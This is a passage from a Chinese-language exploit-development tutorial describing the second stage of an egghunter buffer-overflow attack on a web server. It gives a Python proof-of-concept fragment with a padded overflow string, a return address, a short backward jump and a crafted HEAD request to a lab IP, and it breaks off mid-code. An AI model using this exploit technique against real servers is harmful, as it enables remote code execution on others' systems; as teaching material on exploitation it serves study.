## 第二阶段

现在只剩下布置蛋(shellcode)了。HTTP请求包含几个字段，不是所有的字段都有必要设置，为了方便我把它们叫做字段1,2,3,4,5。让我们看看设置`User-Agent`为1000字节`metasploit`模式的字符串时候会发生什么，`POC`如下：

```python

import socket

import os

# (3) Enough room for egghunter; marker "b33f"                                  #
#-------------------------------------------------------------------------------#

Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.111.128:8080\r\n"
```
